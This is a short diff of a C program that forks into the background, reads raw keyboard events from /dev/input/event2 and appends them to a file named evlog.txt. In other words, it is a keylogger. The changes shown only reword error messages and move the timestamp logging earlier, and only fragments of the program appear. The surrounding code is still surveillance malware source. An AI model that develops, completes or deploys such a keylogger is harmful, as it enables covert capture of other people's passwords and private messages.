@@ -32,7 +32,7 @@ int main(void) {
 	process_id = fork();			/* fork a child process */
 
 	if (process_id < 0) {
-		printf("ERROR: fork() failed.\n");
+		printf("ERROR: fork failure\n");
 		exit(1);
 	}
 	if (process_id > 0) {
@@ -59,13 +59,14 @@ int main(void) {
 	evlog = fopen("evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY|O_TRUNC|O_NONBLOCK);	/* key event file */
 
+	time_t curtime;
+	time(&curtime);
+
 	if (evlog == NULL) {
-		fprintf(stderr, "ERROR: Log file not found\n");
+		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
 		return 1;
 	}
 
-	time_t curtime;
-	time(&curtime);
 	fprintf(evlog, "\n\n%s", ctime(&curtime));
 
 	while(1) {
